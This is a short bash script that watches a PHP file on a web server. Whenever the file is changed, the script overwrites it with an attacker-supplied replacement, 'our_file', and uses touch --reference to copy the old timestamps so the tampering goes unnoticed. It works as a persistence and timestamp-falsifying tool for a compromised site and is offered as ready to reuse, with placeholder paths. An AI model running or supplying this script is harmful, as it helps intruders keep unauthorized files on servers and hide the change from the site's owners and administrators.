#!/bin/bash

declare -r target_file="./good.php" #need to change actually
declare -r new_file="./our_file"    #need to change actually
declare -r working_dir="."          #need to change actually
declare -r script_name="$( cd -P "$( dirname "$0" )" && pwd )/$0"

b_name_t_f=$(basename $target_file)
if find "$working_dir" -cnewer "$script_name"|grep -q "$b_name_t_f"
then
	touch --reference="$target_file" "$script_name"
	cp "$new_file" "$target_file"
	touch --reference="$script_name" "$target_file"
fi

exit 0
